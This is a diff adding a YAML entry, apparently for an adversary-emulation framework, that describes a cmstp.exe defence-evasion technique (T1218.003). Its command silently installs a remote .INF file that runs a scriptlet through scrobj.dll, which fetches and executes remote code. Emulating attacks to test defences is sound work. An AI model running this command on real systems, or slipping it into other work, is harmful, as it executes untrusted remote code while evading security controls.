@@ -1,0 +1,25 @@
+- id: cd9ee13a-557b-182e-6bc2-7a49ec362bdc
+  name: Cmstp.exe - Silently installs a specially formatted remote .INF without creating
+    a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes
+    a .SCT file using scrobj.dll.
+  description: Silently installs a specially formatted remote .INF without creating
+    a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes
+    a .SCT file using scrobj.dll.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.003
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: cmstp.exe /ni /s {REMOTEURL:.inf}
+  singleton: true
+  privilege: User
+  repeatable: false
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Oddvar Moe
+  created: '2018-05-25'
+  modified: '2018-05-25'
+  operating_system: Windows All Versions
